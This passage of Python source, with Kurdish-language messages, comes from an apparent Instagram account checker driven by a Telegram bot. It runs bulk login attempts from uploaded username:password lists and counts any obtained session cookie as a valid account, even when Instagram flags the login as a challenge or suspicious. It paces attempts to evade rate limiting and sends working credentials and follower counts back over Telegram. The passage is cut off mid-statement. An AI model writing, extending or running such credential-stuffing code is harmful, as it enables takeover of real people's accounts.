                        profile_response = session.get(
                            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                            headers=verify_headers
                        )
                        
                        if profile_response.status_code == 200:
                            log_debug("Could access profile data despite challenge - marking as valid")
                            
                            # Save the session
                            save_session(username, session)
                            
                            return {'status': 'valid', 'message': 'ئەکاونتا دروست دگەل چالێنج', 'session': session}
                        else:
                            log_debug(f"Failed to access profile despite sessionid, status: {profile_response.status_code}")
                    except Exception as e:
                        log_debug(f"Error verifying profile with challenge: {str(e)}")
                
                return {'status': 'generic_challenge', 'message': 'گالەنجا ئەمنایەتیێ', 'session': None}
            
            # CASE 6: Suspicious login
            if 'suspicious' in str(result).lower():
                log_debug(f"Suspicious login for {username}")
                
                # Check for valid session
                if session.cookies.get('sessionid'):
                    log_debug(f"Got sessionid despite suspicious flag for {username}")
                    
                    # Verify with profile data
                    try:
                        verify_headers = base_headers.copy()
                        verify_headers['X-IG-App-ID'] = '936619743392459'
                        
                        profile_response = session.get(
                            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                            headers=verify_headers
                        )
                        
                        if profile_response.status_code == 200:
                            log_debug("Could access profile data despite suspicious flag - marking as valid")
                            
                            # Save session
                            save_session(username, session)
                            
                            return {'status': 'valid', 'message': 'ئەکاونتا دروست (گومانبار)', 'session': session}
                        else:
                            log_debug(f"Failed to access profile despite sessionid, status: {profile_response.status_code}")
                    except Exception as e:
                        log_debug(f"Error verifying profile with suspicious flag: {str(e)}")
                
                return {'status': 'suspicious', 'message': 'لۆگینا گومانبار', 'session': None}
            
            # CASE 7: Explicitly failed authentication
            if result.get('authenticated') is False:
                log_debug(f"Authentication explicitly failed for {username}")
                return {'status': 'invalid', 'message': 'ناسناما نەدروست', 'session': None}
            
            # CASE 8: Check for session despite any issues
            if session.cookies.get('sessionid'):
                log_debug(f"Got sessionid for {username} despite unclear response")
                
                # Verify session validity with profile request
                try:
                    verify_headers = base_headers.copy()
                    verify_headers['X-IG-App-ID'] = '936619743392459'
                    
                    profile_response = session.get(
                        f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                        headers=verify_headers
                    )
                    
                    if profile_response.status_code == 200:
                        log_debug("Could access profile data - marking as valid despite unclear response")
                        
                        # Save this valid session
                        save_session(username, session)
                        
                        return {'status': 'valid', 'message': 'ئەکاونتا دروست (نەپاڤەکری)', 'session': session}
                    else:
                        log_debug(f"Profile request failed with status: {profile_response.status_code}")
                except Exception as e:
                    log_debug(f"Error verifying profile: {str(e)}")
            
            # CASE 9: Default case - authentication failed
            log_debug(f"Login failed with unknown reason for {username}")
            
            # Try one more verification with profile access as a last resort
            try:
                log_debug("Final attempt: trying to access profile directly")
                profile_response = session.get(
                    f"https://www.instagram.com/{username}/",
                    headers=base_headers
                )
                
                if profile_response.status_code == 200 and session.cookies.get('sessionid'):
                    log_debug("Direct profile access worked - marking as valid as last resort")
                    save_session(username, session)
                    return {'status': 'valid', 'message': 'ئەکاونتا دروست (ڤەرێکرنا داویێ)', 'session': session}
            except:
                pass
                
            return {'status': 'invalid', 'message': 'ناسناما نەدروست', 'session': None}
            
        except Exception as e:
            log_debug(f"Exception during login request: {str(e)}")
            return {'status': 'error', 'message': f'هەلەیا راکێتێ: {str(e)}', 'session': None}

    except Exception as e:
        log_debug(f"General exception for {username}: {str(e)}")
        return {'status': 'error', 'message': str(e), 'session': None}
def process_accounts(credentials_file, telegram_id, bypass_check=True):
    show_banner()

    # Get user IP if available
    user_ip = user_ips.get(str(telegram_id), "نەزانکری")  # Default to "unknown" if not found
    
    # Log IP information
    print(Fore.YELLOW + f"دەستپێکرنا چێککرنێ بۆ کارهێنەرێ {telegram_id} ب IP: {user_ip}" + Style.RESET_ALL)

    # چێککرنا کا کارهێنەر ئەندامێ کەنالا تەلیگرامە
    if not bypass_check:
        print(Fore.YELLOW + f"چێککرنا کا تۆ ئەندامێ کەنالا @{TELEGRAM_CHANNEL} یی..." + Style.RESET_ALL)
        if not check_telegram_membership(telegram_id):
            print(Fore.RED + f"دڤێت تۆ ببیە ئەندامێ کەنالا تەلیگرامێ @{TELEGRAM_CHANNEL} داکو ڤێ ئامرازێ بکارینی." + Style.RESET_ALL)

            # پرسیار ژ کارهێنەری بکە کا دخوازیت بۆریت
            override = input(Fore.YELLOW + "ئەرێ تۆ خودانێ کەنالێ یی یان ئارێشە د پشتراستکرنێ دە هەیە؟ 'override' تایپ بکە بۆ بۆراندنا چێککرنێ: " + Style.RESET_ALL)
            if override.lower() == 'override':
                print(Fore.GREEN + "چێککرن هاتە بۆراندن. بەردەوامکرن..." + Style.RESET_ALL)
            else:
                send_telegram_message(telegram_id, f"❌ دڤێت تۆ ببیە ئەندامێ @{TELEGRAM_CHANNEL} داکو ڤێ ئامرازێ بکارینی.")
                print(Fore.YELLOW + f"تکایە ببە ئەندامێ @{TELEGRAM_CHANNEL} ل تەلیگرامێ و دووبارە هەول بدە." + Style.RESET_ALL)
                return

    # چێککرنا کا فایلێ ناسناما هەیە
    accounts = []
    if not os.path.exists(credentials_file):
        print(Fore.YELLOW + f"ئاگەهداری: فایلێ '{credentials_file}' نەهاتە دیتن. فایلەکێ نوی یێ ڤالا درست دکەین." + Style.RESET_ALL)
        send_telegram_message(telegram_id, f"⚠️ ئاگەهداری: فایلێ '{credentials_file}' نەهاتە دیتن. فایلەکێ نوی یێ ڤالا درست کر.")

        # درستکرنا فایلێ ڤالا
        with open(credentials_file, 'w', encoding='utf-8') as f:
            f.write("")

        # پرسیار ژ کارهێنەری بۆ زێدەکرنا ئەکاونتان راستەوخۆ
        print(Fore.YELLOW + "ئەکاونتێن ئینستاگرامێ بشێوەیێ 'username:password' زێدەبکە (هەر ئێک ل خەتەکێ)" + Style.RESET_ALL)
        print(Fore.YELLOW + "پشتی تەمامکرنێ، خەتەکا ڤالا تایپ بکە بۆ دەستپێکرنا چێککرنێ" + Style.RESET_ALL)

        while True:
            account_line = input()
            if not account_line:
                break

            if ':' in account_line:
                parts = account_line.strip().split(':', 1)
                accounts.append(parts)
            else:
                print(Fore.RED + "فۆرماتا نەدروست. 'username:password' بکارینە" + Style.RESET_ALL)

        # پاراستنا ئەکاونتێن هاتینە زێدەکرن دناڤ فایلێ دە
        with open(credentials_file, 'w', encoding='utf-8') as f:
            for username, password in accounts:
                f.write(f"{username}:{password}\n")
    else:
        # خواندنا ئەکاونتان ژ فایلێ هەیی
        with open(credentials_file, 'r', encoding='utf-8') as file:
            accounts = [line.strip().split(':', 1) for line in file if ':' in line.strip()]

    # چێککرنا کا چ ئەکاونت هەنە بۆ پرۆسێسکرنێ
    if not accounts:
        print(Fore.RED + "چ ئەکاونت نینن بۆ چێککرنێ. تکایە ئەکاونتان زێدەبکە بۆ فایلێ یان راستەوخۆ زێدەبکە." + Style.RESET_ALL)
        send_telegram_message(telegram_id, "❌ چ ئەکاونت نینن بۆ چێککرنێ. تکایە ئەکاونتان زێدەبکە و دووبارە هەول بدە.")
        return

    # ژماردنا فۆرماتا ناسناما دروست
    valid_format_count = len(accounts)

    # هەژماردنا دەمێ پێشبینیکری بە تێکەلکرنا راوەستانان
    pause_count = max(0, (valid_format_count - 1) // 6)  # ژمارا راوەستانێن پێویست
    pause_minutes = 30  # دەقیقە بۆ هەر راوەستانەکێ
    total_pause_time = pause_count * pause_minutes  # سەرجەمێ دەمێ راوەستانێ بە دەقیقان
    estimated_check_time = valid_format_count * 3  # دەمێ پێشبینیکری یێ چێککرنێ بێی راوەستان (3 دەقیقە بۆ هەر ئەکاونتەکێ)
    total_estimated_time = estimated_check_time + total_pause_time  # سەرجەمێ دەمێ پێشبینیکری بتێکەلکرنا راوەستانان

    # هنارتنا پەیاما سەرەتایی یا بەرفرەهـ دگەل دەمێ پێشبینیکری یێ نویکری
    initial_msg = (
        f"🔍 <b>دەستپێکرنا پرۆسەیا چێککرنا ئەکاونتان</b>\n\n"
        f"🌐 <b>IP یا کارهێنەری:</b> <code>{user_ip}</code>\n"
        f"📋 {valid_format_count} ئەکاونت هاتنە دیتن بۆ چێککرنێ\n"
        f"🔄 پرۆسێسکرن دێ نوکە دەستپێکەت\n"
        f"⏱️ دەمێ پێشبینیکری: ~{int(estimated_check_time)} دەقیقە بۆ چێککرنێ\n"
        f"⏸️ زێدەباری {pause_count} راوەستان ب {pause_minutes} دەقیقەیا هەر ئێک\n"
        f"⌛ سەرجەمێ دەمێ پێشبینیکری: ~{int(total_estimated_time)} دەقیقە\n\n"
        f"<i>ئەڤ پەیامە دێ بپێشکەفتنێ هێتە نویکرن...</i>"
    )
    progress_msg_id = send_telegram_message(telegram_id, initial_msg)

    # Continue with rest of your function...

    print(Fore.YELLOW + f"\nچێککرنا {len(accounts)} ئەکاونتان دگەل راوەستانێن 30-دەقیقەیی پشتی هەر 6 ئەکاونتان...\n" + Style.RESET_ALL)

    results = {
        'valid': [],
        'two_factor': [],
        'security_code': [],
        'suspicious': [],
        'generic_challenge': [],
        'invalid': [],
        'error': []
    }
    # درستکرن یان پاقژکرنا فایلێ ئەکاونتێن دروست
    with open(CONFIG['VALID_ACCOUNTS_FILE'], 'w', encoding='utf-8') as f:
        f.write("")  # پاقژکرنا فایلێ

    # بەدویڤچوونا ستاتوسێ یا هویر
    last_update_time = time.time()
    update_interval = 10  # چرکە
    start_time = time.time()
    checking_log = []

    for i, (username, password) in enumerate(accounts):
        # زێدەکرنا راوەستانەکا 30-دەقیقەیی پشتی هەر 6 ئەکاونتان (نە بەری ئەکاونتا یەکێ)
        if i > 0 and i % 6 == 0:
            pause_start_time = time.time()
            pause_end_time = pause_start_time + (30 * 60)  # 30 دەقیقە بە چرکان

            # راوەستانێ ل کونسولێ تۆمار بکە
            print(Fore.CYAN + f"\n[راوەستان] راوەستانەکا 30-دەقیقەیی پشتی چێککرنا {i} ئەکاونتان بۆ رێگرتن ژ سنووردارکرنا رەیتێ..." + Style.RESET_ALL)

            # نویکرنا پەیاما پێشکەفتنێ بۆ نیشاندانا راوەستانێ - MODIFIED: بە تەنها نویکرنا پەیاما هەیی بێی هنارتنا پەیاما نوی
            progress = int((i / len(accounts)) * 100)
            pause_progress_msg = (
                f"⏸️ <b>چێکەرا ئەکاونتێن ئینستاگرام - راوەستیای</b>\n\n"
                f"✅ <b>پێشکەفتن:</b> {progress}% تەمام ({i}/{len(accounts)})\n"
                f"⏱️ <b>راوەستان دەستپێکر:</b> {time.strftime('%H:%M:%S', time.localtime())}\n"
                f"⏰ <b>راوەستان دێ خلاسبیت:</b> {time.strftime('%H:%M:%S', time.localtime(pause_end_time))}\n"
                f"⌛ <b>دەمێ مایی د راوەستانێ دە:</b> 30:00\n\n"
                f"<b>ئەنجامێن نوکە:</b>\n"
                f"✓ ئەکاونتێن دروست: {len(results['valid'])}\n"
                f"🔐 ئەکاونتێن 2FA: {len(results['two_factor'])}\n"
                f"⚠️ ئەکاونتێن چالێنجکری: {len(results['generic_challenge'])}\n"
                f"❌ ئەکاونتێن نەدروست: {len(results['invalid'])}\n"
                f"⚡ هەلە: {len(results['error'])}\n"
            )
            update_telegram_message(telegram_id, progress_msg_id, pause_progress_msg)

            # دەستپێکرنا حەلقەیا هژماردنا بەرەف خوارێ
            remaining_time = 30 * 60  # 30 دەقیقە بە چرکان
            last_minute_update = 30

            # نویکرنا هژماردنا بەرەڤخوارێ هەر دەقیقەیەکێ
            while remaining_time > 0:
                time.sleep(60)  # چاڤەرێکرن بۆ 1 دەقیقە
                remaining_time -= 60
                current_minute = remaining_time // 60

                # نویکرنا پەیاما هژماردنێ هەر دەقیقەیەکێ
                if current_minute < last_minute_update:
                    last_minute_update = current_minute
                    pause_progress_msg = (
                        f"⏸️ <b>چێکەرا ئەکاونتێن ئینستاگرام - راوەستیای</b>\n\n"
                        f"✅ <b>پێشکەفتن:</b> {progress}% تەمام ({i}/{len(accounts)})\n"
                        f"⏱️ <b>راوەستان دەستپێکر:</b> {time.strftime('%H:%M:%S', time.localtime(pause_start_time))}\n"
                        f"⏰ <b>راوەستان دێ خلاسبیت:</b> {time.strftime('%H:%M:%S', time.localtime(pause_end_time))}\n"
                        f"⌛ <b>دەمێ مایی د راوەستانێ دە:</b> {current_minute}:{remaining_time % 60:02d}\n\n"
                        f"<b>ئەنجامێن نوکە:</b>\n"
                        f"✓ ئەکاونتێن دروست: {len(results['valid'])}\n"
                        f"🔐 ئەکاونتێن 2FA: {len(results['two_factor'])}\n"
                        f"⚠️ ئەکاونتێن چالێنجکری: {len(results['generic_challenge'])}\n"
                        f"❌ ئەکاونتێن نەدروست: {len(results['invalid'])}\n"
                        f"⚡ هەلە: {len(results['error'])}\n"
                    )
                    update_telegram_message(telegram_id, progress_msg_id, pause_progress_msg)

            # تۆمارکرنا تەمامبوونا راوەستانێ
            print(Fore.GREEN + f"[بەردەوامبوون] راوەستان تەمام بوو. بەردەوامبوون ب چێککرنا ئەکاونتان..." + Style.RESET_ALL)

            # نویکرنا پەیاما پێشکەفتنێ دجیاتی هنارتنا پەیامەکا نوی
            resume_progress_msg = (
                f"▶️ <b>چێکەرا ئەکاونتێن ئینستاگرام - بەردەوامکرن</b>\n\n"
                f"✅ <b>پێشکەفتن:</b> {progress}% تەمام ({i}/{len(accounts)})\n"
                f"⏱️ <b>راوەستان تەمام بوو</b>\n"
                f"🔄 <b>بەردەوامکرنا چێککرنا ئەکاونتان...</b>\n\n"
                f"<b>ئەنجامێن نوکە:</b>\n"
                f"✓ ئەکاونتێن دروست: {len(results['valid'])}\n"
                f"🔐 ئەکاونتێن 2FA: {len(results['two_factor'])}\n"
                f"⚠️ ئەکاونتێن چالێنجکری: {len(results['generic_challenge'])}\n"
                f"❌ ئەکاونتێن نەدروست: {len(results['invalid'])}\n"
                f"⚡ هەلە: {len(results['error'])}\n"
            )
            update_telegram_message(telegram_id, progress_msg_id, resume_progress_msg)

        current_time = time.time()
        elapsed = current_time - start_time

        # نویکرنا پەیاما پێشکەفتنێ ل تەلیگرامێ دەمدەم
        if current_time - last_update_time >= update_interval:
            progress = int((i / len(accounts)) * 100)

            # هەژماردنا دەمێ مایی یێ پێشبینیکری
            if i > 0:
                avg_time_per_account = elapsed / i
                est_time_remaining = avg_time_per_account * (len(accounts) - i)

                # زێدەکرنا دەمێ راوەستانێن مایی بۆ پێشبینیێ
                remaining_pauses = max(0, ((len(accounts) - i - 1) // 6))
                pause_time_remaining = remaining_pauses * (30 * 60)  # بە چرکان
                est_time_remaining += pause_time_remaining

                time_remaining_str = f"{int(est_time_remaining / 60)} دەقیقە {int(est_time_remaining % 60)} چرکە"
            else:
                time_remaining_str = "ژمێریار..."

            # درستکرنا پەیاما پێشکەفتنا بەرفرەهـ دگەل ستاتیستیکێن زندی
            progress_msg = (
                f"⏳ <b>چێکەرا ئەکاونتێن ئینستاگرام - پێشکەفتن</b>\n\n"
                f"✅ <b>پێشکەفتن:</b> {progress}% تەمام ({i}/{len(accounts)})\n"
                f"⏱️ <b>دەمێ بووری:</b> {int(elapsed / 60)} دەق {int(elapsed % 60)} چرک\n"
                f"⏳ <b>دەمێ مایی یێ پێشبینیکری:</b> {time_remaining_str}\n"
                f"⏸️ <b>راوەستانێن مایی:</b> {remaining_pauses} (هەر ئێک 30 دەق)\n\n"
                f"<b>ئەنجامێن نوکە:</b>\n"
                f"✓ ئەکاونتێن دروست: {len(results['valid'])}\n"
                f"🔐 ئەکاونتێن 2FA: {len(results['two_factor'])}\n"
                f"⚠️ ئەکاونتێن چالێنجکری: {len(results['generic_challenge'])}\n"
                f"❌ ئەکاونتێن نەدروست: {len(results['invalid'])}\n"
                f"⚡ هەلە: {len(results['error'])}\n\n"
            )

            # زێدەکرنا دوماهیک 5 ئەکاونتێن پرۆسێسکری (یان کێمتر ئەگەر مە ئەوەندە پرۆسێس نەکربیت)
            if checking_log:
                progress_msg += "<b>چالاکیێن نوی:</b>\n"
                for log_entry in checking_log[-5:]:
                    progress_msg += f"{log_entry}\n"

            update_telegram_message(telegram_id, progress_msg_id, progress_msg)
            last_update_time = current_time

        # چێککرنا ئەکاونتێ
        result = check_account(username, password)
        status = result['status']
        results[status].append(username)

        # درستکرنا تۆمارێ
        timestamp = time.strftime("%H:%M:%S", time.localtime())

        # بۆ ئەکاونتێن دروست، بدەستڤەئینانا ژمارا فۆلۆوەران و پاراستن دناڤ فایلێ دە
        if status == 'valid':
            session = result.pop('session')  # لابرنا سێشنێ ژ ئەنجامێ بۆ رێگرتن ژ کێشێن سێریالیزەیشنێ
            followers = get_follower_count(session, username)

            # پاراستن دناڤ فایلێ دە
            with open(CONFIG['VALID_ACCOUNTS_FILE'], 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password} | فۆلۆوەر: {followers}\n")

            # چاپکرن ل کونسولێ دگەل فۆلۆوەران
            print("\n" + Fore.GREEN + f"[VALID] {username}:{password} | فۆلۆوەر: {followers}" + Style.RESET_ALL)

            # زێدەکرن بۆ تۆمارێ
            log_entry = f"✅ {timestamp}: <code>{username}</code> - دروست (👥 {followers})"
            checking_log.append(log_entry)

            # هنارتنا ئاگەهداریا راستەوخۆ بۆ ئەکاونتا دروست
            send_telegram_message(
                telegram_id,
                f"✅ <b>ئەکاونتا دروست</b>\n<code>{username}:{password}</code>\n👥 فۆلۆوەر: {followers}"
            )
        elif status == 'two_factor':
            print("\n" + Fore.BLUE + f"[2FA] {username}" + Style.RESET_ALL)
            log_entry = f"🔐 {timestamp}: <code>{username}</code> - پاراستی ب 2FA"
            checking_log.append(log_entry)
        elif status == 'security_code':
            print("\n" + Fore.CYAN + f"[SECURITY CODE] {username}" + Style.RESET_ALL)
            log_entry = f"🔑 {timestamp}: <code>{username}</code> - کۆدا ئەمنایەتیێ پێویستە"
            checking_log.append(log_entry)
            # هنارتنا ئاگەهداریا راستەوخۆ بۆ ئەکاونتا کۆدا ئەمنایەتیێ دڤێت
            send_telegram_message(
                telegram_id,
                f"🔑 <b>ئەکاونتا کۆدا ئەمنایەتیێ</b>\n<code>{username}:{password}</code>"
            )
        elif status == 'suspicious':
            print("\n" + Fore.YELLOW + f"[SUSPICIOUS] {username}" + Style.RESET_ALL)
            log_entry = f"⚠️ {timestamp}: <code>{username}</code> - لۆگینا گومانبار"
            checking_log.append(log_entry)
            # هنارتنا ئاگەهداریا راستەوخۆ بۆ ئەکاونتا گومانبار
            send_telegram_message(
                telegram_id,
                f"⚠️ <b>ئەکاونتا گومانبار</b>\n<code>{username}:{password}</code>"
            )
        elif status == 'generic_challenge':
            print("\n" + Fore.MAGENTA + f"[CHALLENGE] {username}" + Style.RESET_ALL)
            log_entry = f"⛔ {timestamp}: <code>{username}</code> - چالێنج پێویستە"
            checking_log.append(log_entry)
            # هنارتنا ئاگەهداریا راستەوخۆ بۆ ئەکاونتا چالێنجکری
            # Removed this code to prevent sending challenge accounts to Telegram bot
            # send_telegram_message(
            #     telegram_id,
            #     f"⛔ <b>ئەکاونتا چالێنجکری</b>\n<code>{username}:{password}</code>"
            # )
        elif status == 'invalid':
            print("\n" + Fore.RED + f"[INVALID] {username}" + Style.RESET_ALL)
            log_entry = f"❌ {timestamp}: <code>{username}</code> - نەدروست"
            checking_log.append(log_entry)
        else:
            print("\n" + Fore.WHITE + f"[ERROR] {username}: {result['message']}" + Style.RESET_ALL)
            log_entry = f"⚡ {timestamp}: <code>{username}</code> - هەلە: {result['message'][:30]}..."
            checking_log.append(log_entry)

        time.sleep(random.uniform(*CONFIG['DELAY_BETWEEN_ATTEMPTS']))

    # هەژماردنا سەرجەمێ دەمێ گرتی
    total_time = time.time() - start_time
    hours = int(total_time / 3600)
    minutes = int((total_time % 3600) / 60)
    seconds = int(total_time % 60)

    # نویکرنا پەیاما پێشکەفتنێ دگەل ئاگەهداریا تەمامبوونێ
    completion_msg = (
        f"✅ <b>پرۆسێسکرن تەمام بوو!</b>\n\n"
        f"📊 <b>ستاتیستیکێن دوماهیێ:</b>\n"
        f"• ئەکاونتێن چێککری: {len(accounts)}\n"
        f"• سەرجەمێ دەم: {hours}ک {minutes}د {seconds}چ\n"
        f"• ناڤنجا دەمی بۆ هەر ئەکاونتەکێ: {int(total_time/len(accounts) if len(accounts) > 0 else 0)} چرکە\n"
        f"• ژمارا راوەستانان: {pause_count} (هەر ئێک 30 دەق)\n\n"
        f"<b>ئەنجامێن هویر:</b>\n"
        f"✅ دروست: {len(results['valid'])}\n"
        f"🔐 پاراستی ب 2FA: {len(results['two_factor'])}\n"
        f"🔑 کۆدا ئەمنایەتیێ پێویست: {len(results['security_code'])}\n"
        f"⚠️ لۆگینێن گومانبار: {len(results['suspicious'])}\n"
        f"⛔ چالێنجێن گشتی: {len(results['generic_challenge'])}\n"
        f"❌ نەدروست: {len(results['invalid'])}\n"
        f"⚡ هەلە: {len(results['error'])}\n\n"
        f"📝 ئەنجامێن تەمام هاتنە پاراستن د فایلا results.json دە"
    )
    update_telegram_message(telegram_id, progress_msg_id, completion_msg)

    # پاراستنا ئەنجامان
    with open('results.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2)

    # کورتەیا دوماهیێ
    print(Fore.CYAN + "\n=== ئەنجامێن دوماهیێ ===" + Style.RESET_ALL)
    print(Fore.GREEN + f"دروست: {len(results['valid'])}" + Style.RESET_ALL)
    print(Fore.BLUE + f"پاراستی ب 2FA: {len(results['two_factor'])}" + Style.RESET_ALL)
    print(Fore.CYAN + f"کۆدا ئەمنایەتیێ پێویست: {len(results['security_code'])}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"لۆگینێن گومانبار: {len(results['suspicious'])}" + Style.RESET_ALL)
    print(Fore.MAGENTA + f"چالێنجێن گشتی: {len(results['generic_challenge'])}" + Style.RESET_ALL)
    print(Fore.RED + f"نەدروست: {len(results['invalid'])}" + Style.RESET_ALL)
    print(Fore.WHITE + f"هەلە: {len(results['error'])}" + Style.RESET_ALL)
       # هنارتنا کورتەیا دوماهیێ بۆ تەلیگرام
    summary_message = (
        f"🏁 <b>کورتەیا ئەنجامێن دوماهیێ</b>\n\n"
        f"✅ دروست: {len(results['valid'])}\n"
        f"🔐 پاراستی ب 2FA: {len(results['two_factor'])}\n"
        f"🔑 کۆدا ئەمنایەتیێ پێویست: {len(results['security_code'])}\n"
        f"⚠️ لۆگینێن گومانبار: {len(results['suspicious'])}\n"
        f"⛔ چالێنجێن گشتی: {len(results['generic_challenge'])}\n"
        f"❌ نەدروست: {len(results['invalid'])}\n"
        f"⚡ هەلە: {len(results['error'])}"
    )
    send_telegram_message(telegram_id, summary_message)

    if len(results['valid']) > 0:
        valid_accounts_msg = f"💾 <b>ئەکاونتێن دروست هاتنە پاراستن د {CONFIG['VALID_ACCOUNTS_FILE']} دە</b>\n\n"

        # لیستکرنا هەمی ئەکاونتێن دروست د پەیامێ دە
        valid_accounts_msg += "<b>ئەکاونتێن دروست:</b>\n"
        for i, username in enumerate(results['valid']):
            # دیتنا پاسوۆردێ ژ لیستا ئەکاونتێن دەستپێکی
            for u, p in accounts:
                if u == username:
                    valid_accounts_msg += f"{i+1}. <code>{username}:{p}</code>\n"
                    break

        send_telegram_message(telegram_id, valid_accounts_msg)

    # Modified this section to exclude generic_challenge accounts
    if len(results['security_code']) > 0 or len(results['suspicious']) > 0:
        # تێکەلکرنا هەمی جۆرێن ئەکاونتێن چالێنجکری
        all_challenged = []
        
        # Only include security_code and suspicious, but not generic_challenge
        for challenge_type in ['security_code', 'suspicious']:
            for username in results[challenge_type]:
                # دیتنا پاسوۆردێ ژ لیستا ئەکاونتێن دەستپێکی
                for u, p in accounts:
                    if u == username:
                        all_challenged.append(f"{username}:{p}")
                        break
                        
        # Only proceed if there are still accounts to report after removing generic_challenge
        if all_challenged:
            # Continue with the existing code to save and send the remaining accounts
            timestamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
            challenge_filename = f"challenged_accounts_{timestamp}.txt"
            
            with open(challenge_filename, "w", encoding='utf-8') as file:
                for account in all_challenged:
                    file.write(account + "\n")
                    
            # فۆرماتکرنا پەیامێ و هنارتنا فایلێ
            challenge_count = len(all_challenged)
            challenge_msg = (
                f"⚠️ <b>ئەکاونتێن چالێنجکری</b>\n\n"
                f"{challenge_count} ئەکاونت هاتنە دیتن کو پێویستی پشتراستکرنێ یان چالێنجێن ئەمنایەتیێ هەنە.\n"
                f"ئەڤ ئەکاونتە دشێن ب دەستێ مرۆڤی بهێنە ڤەگەراندن."
            )

            # هنارتن د پارچەکێن 20 ئەکاونتی دە بۆ رێگرتن ژ سنۆرێن درێژیا پەیامێ
            chunk_size = 20
            for i in range(0, len(all_challenged), chunk_size):
                chunk = all_challenged[i:i+chunk_size]
                chunk_text = "\n".join(chunk)
                send_telegram_message(
                    telegram_id,
                    f"<b>ئەکاونتێن چالێنجکری (پشک {i//chunk_size + 1}/{(len(all_challenged)+chunk_size-1)//chunk_size}):</b>\n\n<code>{chunk_text}</code>"
                )
def handle_telegram_updates():
    """هەلگرتنا پەیامێن تەلیگرامێ یێن هاتین"""
    last_update_id = 0
    broadcast_mode = {}  # To track which admins are in broadcast mode

    # دانانا گۆهەرباری bypass_check ل ڤێرێ
    bypass_check_for_bot = CONFIG.get('BYPASS_BY_DEFAULT', True)  # وەرگرتنا بەهایێ ژ CONFIG

    print(Fore.GREEN + f"بۆت دەستپێکر ب مۆدا {'BYPASS - چێککرنێن ئەندامەتیا کەنالێ نەچالاکە' if bypass_check_for_bot else 'ئاسایی - چێککرنێن ئەندامەتیا کەنالێ چالاکە'}" + Style.RESET_ALL)

    while True:
        try:
            # وەرگرتنا نویکرنان ژ تەلیگرامێ
            response = requests.get(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates",
                params={
                    "offset": last_update_id + 1,
                    "timeout": 30
                }
            )

            if response.status_code == 200:
                updates = response.json().get('result', [])

                for update in updates:
                    last_update_id = update['update_id']

                    # هەلگرتنا پرسیارێن کالباک (کلیکێن بتنان)
                    if 'callback_query' in update:
                        callback_query = update['callback_query']
                        chat_id = callback_query['message']['chat']['id']
                        user_id = callback_query['from']['id']
                        data = callback_query['data']
                        
                        # Record user interaction with user data
                        user_data = callback_query.get('from', {})
                        record_user(user_id, user_data)

                        # هەلگرتنا کالباکا چێکەرا ژمارەیان
                        if data.startswith('generate_numbers:'):
                            # Extract number of phone numbers to generate
                            count = int(data.split(':')[1])
                            
                            # Answer callback query to remove loading indicator
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                                data={"callback_query_id": callback_query['id']}
                            )
                            
                            # Start generation in a separate thread
                            threading.Thread(
                                target=generate_and_send_numbers, 
                                args=(chat_id, count)
                            ).start()
                        elif data == 'broadcast_confirm' and str(user_id) in CONFIG['ADMIN_IDS']:
                            # Answer callback query
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                                data={"callback_query_id": callback_query['id']}
                            )
                            
                            # Enter broadcast mode
                            broadcast_mode[str(user_id)] = True
                            send_telegram_message(
                                chat_id,
                                "✏️ <b>تکایە ئەو پەیامێ دخوازی بهێنە هنارتن بۆ هەمی بەکارهێنەرێن بۆتێ بنڤیسە:</b>\n\n"
                                "<i>دەنگێ /cancel بکارینە بۆ بەتالکرنێ</i>"
                            )

                    # چێککرنا دۆکیۆمێنت/فایلێن هاتینە بارکرن
                    elif 'message' in update and 'document' in update['message']:
                        chat_id = update['message']['chat']['id']
                        user_id = update['message']['from']['id']
                        
                        # Record user interaction with user data
                        user_data = update['message']['from']
                        record_user(user_id, user_data)
                        
                        # Check if we already have the user's IP
                        if str(user_id) not in user_ips:
                            # We don't have the IP yet, ask for it first
                            user_states[str(user_id)] = "waiting_for_ip"
                            
                            # Create keyboard with IP checking site
                            keyboard = InlineKeyboardMarkup([
                                [InlineKeyboardButton("🔎 بینە IP یا خۆ", url="https://whatismyipaddress.com/")]
                            ])
                            
                            send_telegram_message(
                                chat_id,
                                f"⚠️ <b>بەرێ ئەم ئەکاونتێن تە چێک بکەین، تکایە IP یا خۆ پێشکێش بکە:</b>\n\n"
                                f"1️⃣ بتنا '🔎 بینە IP یا خۆ' ئەبجن\n"
                                f"2️⃣ IP یا خۆ کۆپی بکە (نمونە: 123.45.67.89)\n"
                                f"3️⃣ ڤەگەرە ڤێرە و تەنها IP یا خۆ بنڤیسە (بێی هیچ پێشگر یان فەرمان)",
                                keyboard=keyboard
                            )
                            continue
                            
                        document = update['message']['document']
                        file_id = document['file_id']
                        file_name = document.get('file_name', 'unknown.txt')
                        mime_type = document.get('mime_type', '')

                        # چێککرنا کا فایل دەقە (txt)
                        if mime_type == 'text/plain' or file_name.endswith('.txt'):
                            # زانینا کا کارهێنەر ئەندامێ کەنالێیە
                            bypass_check = CONFIG.get('BYPASS_BY_DEFAULT', True)
                            if not bypass_check and not check_telegram_membership(user_id):
                                send_telegram_message(
                                    chat_id,
                                    f"❌ <b>دڤێت تۆ ببیە ئەندامێ @{TELEGRAM_CHANNEL} داکو ڤێ ئامرازێ بکارینی.</b>"
                                )
                                continue

                            # داونلۆدکرنا فایلێ
                            temp_file = download_telegram_file(file_id)
                            if temp_file:
                                # هنارتنا پەیاما سەرپێیی
                                send_telegram_message(
                                    chat_id,
                                    f"📁 <b>فایلا تە ({file_name}) هاتە وەرگرتن!</b>\n\n"
                                    f"⏳ دەستپێکرنا چێککرنا ئەکاونتان...\n"
                                    f"🌐 IP یا تە: <code>{user_ips.get(str(user_id), 'نەزانکری')}</code>"
                                )

                                # مەشاندنا چێککرنێ د ترێدەکێ جودا دە بۆ رێگرتن ژ گیربوونا بۆتێ
                                threading.Thread(
                                    target=process_accounts,
                                    args=(temp_file, chat_id, bypass_check)
                                ).start()
                            else:
                                send_telegram_message(
                                    chat_id,
